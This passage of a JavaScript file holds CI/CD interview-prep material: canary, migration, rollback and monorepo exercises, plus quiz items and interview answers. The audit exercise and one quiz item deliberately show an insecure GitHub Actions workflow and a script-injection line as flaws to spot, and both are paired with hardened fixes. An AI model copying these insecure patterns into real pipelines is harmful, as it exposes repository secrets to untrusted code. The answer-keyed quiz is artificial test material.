# Canary loop. set-weight.sh and error-rate.sh are your platform's commands (load balancer, mesh or rollout tool).
set -euo pipefail

WEIGHTS=(5 25 50 100)
SLACK="\${SLACK:-5}"                     # extra errors per 10,000 allowed on top of the baseline
BAKE_SECONDS="\${BAKE_SECONDS:-300}"     # observe each step long enough to see real traffic

rollback() {
  echo "canary unhealthy at $1%: rolling back" >&2
  ./scripts/set-weight.sh 0              # all traffic back to the old version
  exit 1                                 # the pipeline is marked failed; a human investigates
}

for w in "\${WEIGHTS[@]}"; do
  ./scripts/set-weight.sh "$w"
  sleep "$BAKE_SECONDS"
  canary="$(./scripts/error-rate.sh canary)"        # errors per 10,000 requests
  baseline="$(./scripts/error-rate.sh baseline)"
  allowed=$(( baseline * 2 > baseline + SLACK ? baseline * 2 : baseline + SLACK ))
  echo "weight=$w canary=$canary baseline=$baseline allowed=$allowed"
  if [ "$canary" -gt "$allowed" ]; then
    rollback "$w"
  fi
done
echo "promoted: 100% of traffic is on the new version"`, 'canary.sh'),
    alt: [PY(R`WEIGHTS = [5, 25, 50, 100]


def canary_decision(canary, baseline, slack):
    for i in range(len(canary)):
        allowed = max(2 * baseline[i], baseline[i] + slack)
        if canary[i] > allowed:
            return "rollback@" + str(WEIGHTS[i])      # first unhealthy step wins
    if len(canary) == len(WEIGHTS):
        return "promote"
    return "continue@" + str(WEIGHTS[len(canary)])`, 'canary_decision (tested)')],
    cx: `<p>The decision is O(steps). Time is dominated by the bake windows: 4 steps x 5 minutes = 20 minutes to promote, 5-10 minutes to detect a bad release.</p>`,
    f: ['How would you add a latency (p99) condition?', 'What happens if there is too little traffic at 5% to measure anything?'],
    tests: { sig: 'int[] int[] int -> string', fn: 'canaryDecision', cases: [
      [[[], [], 5], 'continue@5'],
      [[[3], [2], 5], 'continue@25'],
      [[[3, 5, 9, 12], [2, 2, 3, 4], 5], 'rollback@50'],
      [[[1, 2, 3, 4], [1, 2, 3, 4], 0], 'promote'],
      [[[50], [2], 5], 'rollback@5'],
      [[[7], [2], 5], 'continue@25'],
      [[[8], [2], 5], 'rollback@5'],
      [[[3], [0], 2], 'rollback@5'],
      [[[19], [10], 5], 'continue@25'],
      [[[2, 2, 2], [1, 1, 1], 1], 'continue@100'],
      [[[1, 1, 1, 30], [1, 1, 1, 1], 5], 'rollback@100'],
      [[[20, 30], [1, 1], 2], 'rollback@5']
    ] }
  }));

  practice.push(P({
    t: 'Rename a column with zero downtime: an expand/contract pipeline', l: 'Hard', tags: ['database migrations', 'expand contract', 'zero downtime', 'bash'], co: ['Stripe', 'Razorpay', 'Booking.com'],
    s: `<p>You must rename <code>users.fullname</code> to <code>users.display_name</code> on a PostgreSQL database that has 40 million rows and a rolling-deployed app. Plan the change across releases and write the migration script with phases <code>expand</code>, <code>backfill</code> and <code>contract</code> that a pipeline job can run. Requirements: each phase is safe to run twice; the backfill works in small batches; contract refuses to run until no rows are missing the new value; the connection string comes from an environment variable (placeholder). State what the application does in each release.</p>`,
    c: LAB + ' Use a throwaway local PostgreSQL (<code>docker run --rm -e POSTGRES_PASSWORD=dev -p 5432:5432 postgres:16</code>) to try it.',
    ex: `<p>Release 1: schema has both columns, app writes both, reads the old one. Release 2: app reads the new one, still writes both. Release 3 (days later): app uses only <code>display_name</code>; <code>contract</code> drops <code>fullname</code>. At every moment, the previous app version still works against the current schema → ${H.c('g', 'rollback is always possible until contract')}.</p>`,
    bw: `<p>One migration: <code>ALTER TABLE users RENAME COLUMN fullname TO display_name</code> deployed with the app. During a rolling deploy the old instances query <code>fullname</code> and fail, and a rollback of the code cannot undo the rename without another migration.</p>`,
    bc: SH(R`psql "$DATABASE_URL" -c "ALTER TABLE users RENAME COLUMN fullname TO display_name"   # old app instances break instantly`, 'naive single step'),
    q: ['Which step is the first one that cannot be rolled back by redeploying old code?', ['Dropping the old column (contract)', 'Adding the new nullable column', 'Starting to write both columns', 'Backfilling in batches'], 0, 'Everything before contract keeps the old column intact, so old code still works. Dropping destroys the old data path, which is why it happens last, in a separate release, after a safety check.'],
    h: ['<p>Hint 1: expand = <code>ADD COLUMN IF NOT EXISTS display_name text</code> (nullable, no default rewrite).</p>', '<p>Hint 2: backfill = loop <code>UPDATE ... WHERE id IN (SELECT id ... LIMIT 5000)</code> until 0 rows change.</p>', '<p>Hint 3: contract = verify <code>count(*) WHERE display_name IS NULL AND fullname IS NOT NULL</code> is 0, then <code>DROP COLUMN IF EXISTS</code>.</p>'],
    a: `<p>Three phases with idempotent SQL (<code>IF NOT EXISTS</code>, <code>IF EXISTS</code>). The backfill is batched to avoid long locks and replication lag, and sleeps briefly between batches. Contract has a guard. The pipeline runs each phase as its own manual job on the right release, behind a protected environment and a concurrency lock.</p>`,
    code: SH(R`#!/usr/bin/env bash
# scripts/migrate.sh --phase expand|backfill|contract   (DATABASE_URL comes from a secret; shown here as a placeholder)
set -euo pipefail
: "\${DATABASE_URL:?set DATABASE_URL (for example postgres://app:CHANGE-ME@localhost:5432/appdb)}"
phase="\${2:-}"
sql() { psql "$DATABASE_URL" -v ON_ERROR_STOP=1 -tA -c "$1"; }

case "$phase" in
  expand)                                         # release 1: purely additive, old code never notices
    sql "ALTER TABLE users ADD COLUMN IF NOT EXISTS display_name text"
    ;;
  backfill)                                       # between releases: copy in small batches
    while :; do
      n="$(sql "WITH b AS (SELECT id FROM users WHERE display_name IS NULL AND fullname IS NOT NULL LIMIT 5000 FOR UPDATE SKIP LOCKED)
                UPDATE users u SET display_name = u.fullname FROM b WHERE u.id = b.id RETURNING 1" | wc -l)"
      echo "backfilled $n rows"
      [ "$n" -gt 0 ] || break
      sleep 0.2                                   # give replicas and other queries room to breathe
    done
    ;;
  contract)                                       # release 3+: the point of no return, so check first
    missing="$(sql "SELECT count(*) FROM users WHERE display_name IS NULL AND fullname IS NOT NULL")"
    if [ "$missing" -ne 0 ]; then
      echo "refusing to drop fullname: $missing rows are not backfilled" >&2
      exit 1
    fi
    sql "ALTER TABLE users DROP COLUMN IF EXISTS fullname"
    ;;
  *)
    echo "usage: $0 --phase expand|backfill|contract" >&2
    exit 2
    ;;
esac`, 'migrate.sh'),
    cx: `<p>The backfill is O(rows) in constant-size batches. Expand and contract are metadata changes (fast) in PostgreSQL when the new column is nullable without a volatile default.</p>`,
    f: ['What changes if the table is replicated to a read replica with lag?', 'How would you test that release N-1 still works with the schema from release N?']
  }));

  practice.push(P({
    t: 'Audit and harden a risky workflow', l: 'Hard', tags: ['security', 'pull_request_target', 'oidc', 'supply chain'], co: ['GitHub', 'Palo Alto Networks', 'Okta'],
    s: `<p>Review this workflow, list every problem (at least six), and rewrite it. It builds fork PRs and deploys a preview.</p><pre>name: preview
on: pull_request_target
jobs:
  preview:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
        with:
          ref: &#36;{{ github.event.pull_request.head.sha }}
      - uses: some-user/deploy-preview@main
      - run: |
          echo "Deploying &#36;{{ github.head_ref }}"
          npm ci && npm run build
          aws s3 sync dist s3://preview-bucket
        env:
          AWS_ACCESS_KEY_ID: &#36;{{ secrets.AWS_KEY }}
          AWS_SECRET_ACCESS_KEY: &#36;{{ secrets.AWS_SECRET }}</pre><p>The preview must still work for fork PRs, using only placeholders for names.</p>`,
    ex: `<p>Findings include: ${H.c('r', 'pull_request_target + checkout of PR head + running its npm scripts with secrets')}, ${H.c('r', 'self-hosted runner executing fork code')}, ${H.c('y', 'floating @main third-party action')}, ${H.c('r', 'github.head_ref pasted into a script')}, ${H.c('r', 'long-lived AWS keys')}, ${H.c('y', 'no permissions block and no timeout')}.</p>`,
    bw: `<p>Fixing only the obvious one (for example pinning the action) and leaving the structure: untrusted code still runs next to secrets on a machine inside your network.</p>`,
    q: ['What is the right structural fix for building fork PRs and deploying a preview?', ['Build untrusted code in a no-secrets <code>pull_request</code> workflow, then deploy the built files from a trusted <code>workflow_run</code> workflow with OIDC', 'Add a label so only maintainers see the secrets', 'Run it on a self-hosted runner for extra safety', 'Use <code>secrets: inherit</code>'], 0, 'Separating the stage that executes untrusted code (no secrets) from the stage that holds credentials (never executes PR code) removes the dangerous combination.'],
    h: ['<p>Hint 1: split into two workflows: <code>pull_request</code> builds and uploads <code>dist</code>; <code>workflow_run</code> deploys.</p>', '<p>Hint 2: the deploy stage downloads the artifact as data, uses OIDC (<code>id-token: write</code>, <code>role-to-assume</code>) and a hosted runner.</p>', '<p>Hint 3: pin the third-party action to a SHA or drop it; pass any text through <code>env</code>; add <code>permissions</code> and <code>timeout-minutes</code>; use an environment for the preview deploy.</p>'],
    a: `<p>Untrusted code and credentials never meet. Stage 1 builds with no secrets and a read-only token on a hosted runner. Stage 2 is trusted workflow code that never checks out the PR, downloads the artifact, validates the PR number, and uploads with short-lived OIDC credentials to a per-PR path. Everything pinned, minimal and time-limited.</p>`,
    code: Y(R`# --- .github/workflows/preview-build.yml (untrusted stage: no secrets) ---
name: preview-build
on:
  pull_request:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest                       # hosted, ephemeral; never self-hosted for fork code
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: npm ci --ignore-scripts && npm run build
      - run: echo "@{{ github.event.pull_request.number }}" > dist/.pr-number
      - uses: actions/upload-artifact@v4
        with:
          name: preview-dist
          path: dist/
          retention-days: 3
---
# --- .github/workflows/preview-deploy.yml (trusted stage: has credentials, never runs PR code) ---
name: preview-deploy
on:
  workflow_run:
    workflows: [preview-build]
    types: [completed]
permissions:
  contents: read
  actions: read
  id-token: write
jobs:
  deploy:
    if: @{{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: preview                         # environment-scoped variables, optional reviewers
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: preview-dist
          path: dist/
          run-id: @{{ github.event.workflow_run.id }}
          github-token: @{{ github.token }}
      - name: Read the PR number as untrusted data
        id: pr
        run: |
          n="$(tr -dc '0-9' < dist/.pr-number)"          # digits only
          [ -n "$n" ] || { echo "bad PR number" >&2; exit 1; }
          echo "number=$n" >> "$GITHUB_OUTPUT"
      - uses: aws-actions/configure-aws-credentials@v4   # pin to a full SHA in a real repo
        with:
          role-to-assume: @{{ vars.PREVIEW_ROLE_ARN }}     # arn:aws:iam::123456789012:role/preview-writer (write to one prefix only)
          aws-region: eu-west-1
      - name: Upload to a per-PR prefix
        env:
          PR: @{{ steps.pr.outputs.number }}
        run: aws s3 sync dist "s3://YOUR-PREVIEW-BUCKET/pr-$PR/" --delete`, 'two-stage preview'),
    cx: `<p>Two small workflows instead of one dangerous one; about one extra minute per preview.</p>`,
    f: ['Why <code>npm ci --ignore-scripts</code> in the untrusted stage?', 'How would you stop one PR from overwriting another PR\'s preview?']
  }));

  practice.push(P({
    t: 'Deploy with automatic rollback to the previous digest', l: 'Hard', tags: ['rollback', 'deploy', 'smoke test', 'github actions'], co: ['Amazon', 'Zomato', 'Deutsche Bank'],
    s: `<p>Extend the production job so that a bad deploy rolls back by itself in about two minutes. It must: record the currently running image digest before deploying; deploy the new digest; run a smoke test for up to 90 seconds; if the smoke test fails, redeploy the recorded digest and verify it, and still finish with a failed status; and never run two deploys at once. Use scripts you assume exist (<code>current-image.sh</code>, <code>deploy.sh</code>, <code>smoke.sh</code>); no secrets in the file.</p>`,
    ex: `<p>Live digest <code>sha256:aaa</code>, new <code>sha256:bbb</code>, smoke test fails at 10:04:30 → the job redeploys <code>sha256:aaa</code>, verifies it at 10:06, and ends red. Users saw errors for about two minutes. Smoke passes → job green, <code>sha256:bbb</code> is live.</p>`,
    bw: `<p>Deploy, and if it breaks, a human opens a PR to revert, waits for the full pipeline (25 minutes), and deploys again. Users are down the whole time because the fix path includes rebuilding.</p>`,
    q: ['Why must the rollback step run with <code>if: failure()</code> but the job still end failed?', ['A rolled-back release is still a failed release; the pipeline must not look green and hide the incident', 'GitHub does not allow green jobs after a failure', 'Rollback jobs cost less when red', 'It makes retries faster'], 0, 'Recovery protects users; a red result tells the team a release failed and needs a post-mortem. Hiding it behind green would erase the signal.'],
    h: ['<p>Hint 1: capture the previous image into a step output with <code>id: prev</code> before deploying.</p>', '<p>Hint 2: smoke-test step with a retry loop up to 90 seconds; if it exits non-zero, later steps are skipped unless they have <code>if: failure()</code>.</p>', '<p>Hint 3: the rollback step re-runs deploy with the previous digest; do not <code>continue-on-error</code> the smoke test.</p>'],
    a: `<p>Record, deploy, verify, and on failure restore the recorded digest. Because the previous digest is an immutable image already in the registry, rollback needs no build and no tests. The concurrency group stops a second deploy from interleaving. The job ends failed so the incident is visible.</p>`,
    code: Y(R`name: deploy-production
on:
  workflow_call:
    inputs:
      image:
        type: string
        required: true                         # ghcr.io/YOUR-ORG/app@sha256:...
permissions:
  contents: read
  id-token: write
concurrency:
  group: deploy-production
  cancel-in-progress: false
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@v4   # pin to a full SHA in a real repo
        with:
          role-to-assume: @{{ vars.AWS_ROLE_ARN }}
          aws-region: eu-west-1
      - name: Record what is live right now
        id: prev
        run: echo "image=$(./scripts/current-image.sh production)" >> "$GITHUB_OUTPUT"
      - name: Deploy the new digest
        env:
          IMAGE: @{{ inputs.image }}
        run: ./scripts/deploy.sh production "$IMAGE"
      - name: Smoke test for up to 90 seconds
        run: |
          for i in $(seq 1 18); do
            if ./scripts/smoke.sh https://app.example.com; then exit 0; fi
            sleep 5
          done
          echo "smoke test failed" >&2
          exit 1
      - name: Roll back to the previous digest
        if: failure()
        env:
          PREVIOUS: @{{ steps.prev.outputs.image }}
        run: |
          echo "rolling back to $PREVIOUS" >&2
          ./scripts/deploy.sh production "$PREVIOUS"
          ./scripts/smoke.sh https://app.example.com
          exit 1                                       # recovered, but the release still FAILED`, 'deploy with rollback'),
    cx: `<p>Rollback time is deploy time plus smoke time (about 2 minutes here), independent of build and test duration.</p>`,
    f: ['What if the first deploy ever has no previous image?', 'How would you notify the on-call and create an incident automatically?']
  }));

  practice.push(P({
    t: 'Monorepo: build and test only the services that changed', l: 'Hard', tags: ['monorepo', 'dynamic matrix', 'fromJSON', 'path filters'], co: ['Uber', 'Meta', 'Flipkart'],
    s: `<p>A monorepo has <code>services/api</code>, <code>services/web</code> and <code>services/worker</code> plus shared code in <code>libs/</code>. Write a workflow where a <code>plan</code> job decides which services to test: those whose folder changed, and <b>all</b> of them if <code>libs/</code> or the workflow itself changed. A second job runs a matrix over exactly that list, and is skipped when the list is empty. Fetch enough history for the diff, avoid script injection, and keep a single required check.</p>`,
    ex: `<p>PR touching only <code>services/web/app.js</code> → plan outputs <code>["web"]</code> → one matrix leg. PR touching <code>libs/auth/index.js</code> → <code>["api","web","worker"]</code> → three legs. PR touching only <code>README.md</code> → <code>[]</code> → test job skipped, <code>ci-ok</code> still green.</p>`,
    bw: `<p>Always testing every service. In a 30-service monorepo almost every run is wasted, and the pipeline is the slowest thing in the developer's day.</p>`,
    q: ['A matrix job gets an empty list from <code>fromJSON</code>. What happens?', ['The workflow fails with a matrix error unless the job is skipped with <code>if</code>', 'The job runs once with no values', 'The matrix is ignored', 'GitHub runs all services'], 0, 'An empty matrix is an error, so guard the job with if: needs.plan.outputs.services != \'[]\' (or similar).'],
    h: ['<p>Hint 1: <code>fetch-depth: 0</code> and <code>git diff --name-only BASE...HEAD</code>.</p>', '<p>Hint 2: take the second path segment of <code>services/&lt;name&gt;/...</code> with <code>cut</code>, build JSON with <code>jq</code>.</p>', '<p>Hint 3: write the JSON to <code>$GITHUB_OUTPUT</code>; pass the base SHA via <code>env</code>; the aggregate job uses <code>if: always()</code>.</p>'],
    a: `<p>A planning job turns file paths into a JSON array; the matrix consumes it with <code>fromJSON</code>. Shared code expands the list to everything. An aggregate job gives branch protection one stable name even when the matrix is empty or skipped.</p>`,
    code: Y(R`name: ci
on:
  pull_request:
permissions:
  contents: read
concurrency:
  group: ci-@{{ github.ref }}
  cancel-in-progress: true
jobs:
  plan:
    runs-on: ubuntu-latest
    outputs:
      services: @{{ steps.plan.outputs.services }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0                            # the diff needs history
          persist-credentials: false
      - id: plan
        env:
          BASE: @{{ github.event.pull_request.base.sha }}
          WORKFLOW_FILE: .github/workflows/ci.yml
        run: |
          changed="$(git diff --name-only "$BASE"...HEAD)"
          all='["api","web","worker"]'
          if printf '%s\n' "$changed" | grep -Eq "^(libs/|$WORKFLOW_FILE)"; then
            list="$all"                             # shared code or the pipeline changed: test everything
          else
            list="$(printf '%s\n' "$changed" | grep '^services/' | cut -d/ -f2 | sort -u | jq -R -s -c 'split("\n") | map(select(length > 0))')"
            [ -n "$list" ] || list='[]'
          fi
          echo "services=$list" >> "$GITHUB_OUTPUT"
          echo "testing: $list"

  test:
    needs: plan
    if: needs.plan.outputs.services != '[]'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        service: @{{ fromJSON(needs.plan.outputs.services) }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: services/@{{ matrix.service }}/package-lock.json
      - run: npm ci && npm test
        working-directory: services/@{{ matrix.service }}

  ci-ok:                                            # the single required check
    if: always()
    needs: [plan, test]
    runs-on: ubuntu-latest
    steps:
      - env:
          PLAN: @{{ needs.plan.result }}
          TEST: @{{ needs.test.result }}
        run: |
          echo "plan=$PLAN test=$TEST"
          [ "$PLAN" = "success" ] && { [ "$TEST" = "success" ] || [ "$TEST" = "skipped" ]; }`, 'monorepo ci.yml'),
    cx: `<p>Work is proportional to what changed, not to the size of the repo. The plan job adds seconds.</p>`,
    f: ['How would you handle a service that depends on another service\'s folder?', 'What could go wrong with a squash-merge or rebased PR when computing the base?']
  }));

  // ───────────────────────── Quiz ─────────────────────────
  function Q(q, options, answer, explain) { quiz.push({ q: q, options: options, answer: answer, explain: explain }); }
  Q('What is the difference between continuous delivery and continuous deployment?', ['Delivery keeps every change release-ready and a human decides when to ship; deployment ships every passing change automatically', 'They are the same thing', 'Delivery is for mobile apps only', 'Deployment needs no tests'], 0, 'Both start with CI. Delivery stops at "ready to deploy"; deployment goes all the way to production without a click.');
  Q('A workflow has <code>on: pull_request: paths: [\'src/**\']</code>. A PR changes only <code>README.md</code>. What happens?', ['The workflow does not run', 'It runs but skips all jobs with a green result', 'It runs once a day', 'It fails'], 0, 'No changed file matches the filter, so no run is created. If that check is required, the PR will wait; use an always-running aggregate check.');
  Q('Jobs <code>a</code> (3 min), <code>b</code> (5 min) and <code>c</code> (4 min, <code>needs: [a, b]</code>) are in one workflow. How long does the workflow take?', ['9 minutes', '12 minutes', '5 minutes', '4 minutes'], 0, 'a and b run in parallel, so c can start at minute 5 (the slower one) and ends at 9. The critical path is b then c.');
  Q('Which key makes older runs of a CI workflow on the same PR stop when you push again?', ['<code>concurrency</code> with a ref-based group and <code>cancel-in-progress: true</code>', '<code>timeout-minutes</code>', '<code>fail-fast: true</code>', '<code>needs</code>'], 0, 'concurrency groups run one at a time; cancel-in-progress cancels the older run when a new one in the same group starts.');
  Q('Why should production deploys use <code>cancel-in-progress: false</code>?', ['A half-finished deploy is dangerous; queue instead of killing it', 'Cancelling is not supported for deploys', 'It makes deploys faster', 'It avoids using runners'], 0, 'Cancelling mid-deploy can leave migrations applied and code not switched. Let it finish; the newest pending run goes next.');
  Q('Your cache key is <code>deps-@{{ github.sha }}</code>. What is the problem?', ['Every commit has a new SHA, so the key never matches and the cache is never reused', 'SHAs are too long for keys', 'The key leaks the commit', 'It only works on Windows'], 0, 'Keys should change only when the cached content should change, such as when the lockfile hash changes.');
  Q('An exact cache key misses; restore-keys are <code>["npm-linux-", "npm-"]</code>; stored keys include <code>npm-linux-1</code> (older) and <code>npm-linux-2</code> (newer). What is restored?', ['<code>npm-linux-2</code>, as a partial hit', '<code>npm-linux-1</code>', 'Nothing', 'Both, merged'], 0, 'Restore keys are prefixes tried in order; the first prefix with any match decides, and GitHub takes the most recent match.');
  Q('You need to hand a compiled binary from a build job to a deploy job. Which is correct?', ['<code>upload-artifact</code> in the build job and <code>download-artifact</code> in the deploy job', '<code>actions/cache</code> with a fixed key', 'Rebuild it in the deploy job', 'It is shared automatically'], 0, 'Artifacts are results passed between jobs. Caches are optional speed-ups and may be missing.');
  Q('What does <code>permissions: id-token: write</code> allow?', ['The job can request an OIDC token to authenticate to a cloud provider', 'The job can write secrets', 'The job can push code', 'The job can create tokens for other repos'], 0, 'It lets the job ask GitHub for a signed identity token that the cloud exchanges for short-lived credentials. It does not grant repository write access.');
  Q('Which trust-policy condition most precisely limits an AWS role to production deployments of one repository?', ['<code>sub</code> equals <code>repo:ORG/REPO:environment:production</code>', '<code>aud</code> equals <code>sts.amazonaws.com</code>', '<code>sub</code> like <code>repo:ORG/*</code>', 'No condition is needed'], 0, 'aud only names AWS. A wildcard sub trusts every repo in the organisation. The exact sub ties the role to one repo and one environment.');
  Q('"Build once, deploy many" means:', ['The same image digest is promoted from staging to production; config differs, the artifact does not', 'Build in each environment with different flags', 'Build only on Fridays', 'Deploy only one environment'], 0, 'What you tested must be what you ship. Rebuilding for production runs untested bytes.');
  Q('Which strategy gives the fastest rollback and the highest infrastructure cost?', ['Blue-green', 'Rolling', 'Recreate', 'Canary with 1% traffic'], 0, 'Blue-green keeps a full idle copy, so switching back takes seconds, at the price of running two environments.');
  Q('A canary at 5% has 30 errors per 10,000 requests while the baseline has 4. With the rule "at most max(2 x baseline, baseline + 5)", what happens?', ['It is unhealthy (30 &gt; 9) and the rollout rolls back', 'It is healthy', 'It waits another hour', 'It jumps to 100%'], 0, 'Allowed is max(8, 9) = 9. 30 is above that, so traffic goes back to the old version.');
  Q('You must rename a database column during a rolling deploy. What is safe?', ['Expand (add new column), write both, backfill, read new, then contract (drop old) in a later release', 'One migration with RENAME COLUMN shipped with the code', 'Stop the app for the migration', 'Rename in a start-up hook of every instance'], 0, 'Old and new code run at the same time, so each schema step must work for both. Expand and contract keeps rollback possible until the drop.');
  Q('What is the main danger of <code>pull_request_target</code>?', ['It runs with secrets and a write token, so checking out and running PR code lets an attacker use them', 'It is slower than pull_request', 'It cannot run on forks', 'It disables caching'], 0, 'The trigger runs the base branch workflow with privileges. Running untrusted PR code there hands those privileges to the PR author.');
  Q('Which line is vulnerable to script injection?', ['<code>run: echo "@{{ github.event.issue.title }}"</code>', '<code>env: TITLE: @{{ github.event.issue.title }}</code> then <code>echo "$TITLE"</code>', '<code>run: echo "$GITHUB_SHA"</code>', '<code>run: echo hello</code>'], 0, 'The expression is pasted into the script text before the shell parses it. Passing it through env keeps it as data.');
  Q('Why pin a third-party action to a full commit SHA?', ['Tags and branches can be moved to malicious code; a SHA cannot change', 'SHAs make runs faster', 'Tags are deprecated', 'It reduces the minutes billed'], 0, 'A compromised maintainer can re-point a tag. A commit SHA identifies fixed content, and Dependabot can still propose reviewed upgrades.');

  // ───────────────────────── Interview ─────────────────────────
  function IQ(q, a, level, followUps) { interview.push({ q: q, a: a, level: level, followUps: followUps }); }
  IQ('Explain CI and CD to a new teammate. Where do GitHub Actions fit?',
    '<p>CI means every change is built and tested automatically, so main always works and bugs are found while the change is fresh. Continuous delivery means every passing change is packaged and could be released at any time; continuous deployment means it is released automatically. GitHub Actions is the automation: a workflow file in <code>.github/workflows</code> reacts to events (push, pull request, schedule, manual) and runs jobs on runners. I would show the path: PR triggers CI, required checks gate the merge, main builds an artifact once, staging gets it, and production gets the same artifact after an approval or automated health checks.</p>',
    'B', ['What makes a pipeline "good" beyond being green?', 'What would you measure to know if CD is working? (DORA metrics)']);
  IQ('How do jobs, steps, runners and actions relate? How do you order jobs and pass data between them?',
    '<p>A workflow has jobs; each job runs on its own fresh runner (a VM); a job is a list of steps; a step runs a shell command or uses an action, which is a packaged reusable step. Jobs run in parallel unless <code>needs</code> orders them. Because each job has a clean machine, data crosses jobs in two ways: small strings through job <code>outputs</code> (written to <code>$GITHUB_OUTPUT</code> and read as <code>needs.job.outputs.name</code>) and files through artifacts. Caches are different: they speed things up but may be absent.</p>',
    'B', ['Why does a file created in job A not exist in job B?', 'What does <code>if: always()</code> do?']);
  IQ('Your pipeline takes 25 minutes. Walk me through getting it down to about 6.',
    '<p>First measure: the run view shows time per job and step, and I find the critical path through <code>needs</code>. Typical fixes in order of payoff: path filters so irrelevant changes do not run it; dependency caching (built-in <code>cache:</code> in setup actions); making independent jobs (lint, unit, e2e) parallel; sharding the slowest test job with a matrix and <code>--shard</code>; Docker layer cache; cancelling superseded PR runs with concurrency. I change one thing at a time and re-measure, and I watch that per-job startup overhead does not eat the gain from over-splitting. Only jobs on the critical path matter, so I stop when the longest chain is short enough.</p>',
    'I', ['Why can splitting into more jobs make it slower?', 'How do you balance test shards?']);
  IQ('How do cache keys and restore-keys work, and what goes wrong with them?',
    '<p>Caches are immutable entries identified by a key. On restore GitHub looks for an exact key match; if none, it tries each restore-key as a prefix, in order, and takes the newest entry for the first prefix that matches (a partial hit). On a job success the cache is saved under the exact key if that key does not exist. Good keys include things that change content: OS, tool version, and a hash of the lockfile. Typical bugs: using a commit SHA (never hits), hashing the wrong file (never invalidates), restore-keys that are too broad (stale build output), too many large caches evicting useful ones within the 10 GB limit, and PRs writing caches that evict main\'s. Caches are scoped to branch and base, which protects main from PR poisoning.</p>',
    'I', ['When would you avoid restore-keys?', 'Cache or artifact for a compiled binary needed later?']);
  IQ('Two deploys raced and production ended up on the older version. What happened and how do you prevent it?',
    '<p>Two runs of the deploy job overlapped; the older commit\'s run finished last and overwrote the newer one. I prevent it with a <code>concurrency</code> group on the deploy job with a constant name and <code>cancel-in-progress: false</code>, so deploys queue; the group keeps one running and one pending, and a newer arrival replaces the pending run, which is what we want because only the newest matters. I also make the deploy idempotent and refuse to go backwards by comparing the commit being deployed with the live version. CI jobs, in contrast, use cancel-in-progress true so old PR runs stop.</p>',
    'I', ['Why not cancel in-progress deploys?', 'How would you serialise deploys across several workflows?']);
  IQ('What is the difference between a reusable workflow and a composite action, and when do you use each?',
    '<p>A reusable workflow (<code>on: workflow_call</code>) is called from a job and brings whole jobs: its own runners, environments, permissions and secrets, with typed inputs, secrets and outputs. A composite action is a bundle of steps (<code>action.yml</code> with <code>using: composite</code>) used inside a job on the caller\'s runner; each run step needs a shell and it has no secrets context. I use reusable workflows for a standard build-test-publish pipeline shared by many repos, pinned to a tag or SHA and updated by a bot, and composite actions for repeated setup steps. I pass secrets explicitly rather than <code>secrets: inherit</code> to limit exposure.</p>',
    'I', ['How do you roll out a breaking change to a shared workflow?', 'How does this compare to GitLab include/extends and Jenkins shared libraries?']);
  IQ('Compare GitHub Actions, GitLab CI and Jenkins. What maps to what?',
    '<p>The concepts are the same: triggers, jobs on runners or agents, an order between jobs, caches, artifacts, secrets and gated deploys. GitHub: <code>on</code>, <code>jobs</code>, <code>needs</code>, <code>strategy.matrix</code>, environments with reviewers, <code>concurrency</code>. GitLab: <code>rules</code>, stages and <code>needs</code>, <code>parallel: matrix</code>, <code>environment</code> with <code>when: manual</code>, <code>resource_group</code>, <code>include</code>/<code>extends</code>. Jenkins: a Jenkinsfile with <code>agent</code>, <code>stages</code>, <code>input</code> for approval, <code>lock</code>, <code>withCredentials</code>, shared libraries. Jenkins gives the most flexibility but you operate the controller, agents and plugins; hosted CI trades some flexibility for much less operations. I keep logic in scripts so the YAML stays thin and portable.</p>',
    'I', ['What would you check first when migrating a Jenkins pipeline?', 'Where do plugins create risk?']);
  IQ('How do you handle secrets in a pipeline, and why prefer OIDC to stored cloud keys?',
    '<p>Secrets live in the platform store (organisation, repository or environment level) and are read as <code>secrets.NAME</code>; never in files, images or logs. Environment secrets only reach jobs that pass the environment\'s protection. Masking is only text matching, so a script can still leak a secret by transforming it. Stored cloud keys are long-lived, hard to rotate and fully powerful if leaked. With OIDC the job requests a signed identity token (<code>id-token: write</code>), the cloud verifies claims such as repo and environment against a trust policy, and issues credentials for about an hour. Nothing durable exists to steal, and the trust policy limits which repo, branch or environment can assume which role.</p>',
    'I', ['What do you put in the trust policy\'s sub condition?', 'What do you do when a secret appears in a log?']);
  IQ('Describe rolling, blue-green and canary deployments. When do you choose each?',
    '<p>Rolling replaces instances a few at a time: cheap, no extra capacity, but old and new run together and rollback is another rollout. Blue-green runs a full second environment, checks it, then switches traffic at once: fast rollback and clean testing, but double cost and the switch exposes everyone. Canary sends a small share of real traffic (5, 25, 50, 100 percent), compares error rate and latency with the baseline, and promotes or rolls back automatically: lowest blast radius, needs good metrics and traffic. I choose rolling for low-risk stateless services, blue-green when instant rollback and pre-switch testing matter, canary for high-traffic or high-risk changes. All need backward-compatible schema changes because versions overlap.</p>',
    'I', ['How do you define the automated rollback criteria?', 'What if the canary has too little traffic to measure?']);
  IQ('How do you run database migrations in a pipeline without downtime?',
    '<p>I use expand/contract so every schema change works for both the old and new application versions. Expand: add the new nullable column or table. Deploy code that writes both and reads the old. Backfill in small batches. Switch reads to the new column. Much later, contract: drop the old column in a separate release after a check that nothing needs it. Migrations run as their own pipeline job before the app deploy, under a concurrency lock and a protected environment, with a dry run that prints the SQL for review. Migrations must be idempotent, and I avoid long locks (batching, concurrent index creation). The contract step is the point of no return, so backups and a rehearsal in staging come first.</p>',
    'A', ['Why not run migrations on application start-up?', 'How do you test that the previous app version still works with the new schema?']);
  IQ('What is the difference between deploying and releasing, and where do feature flags fit?',
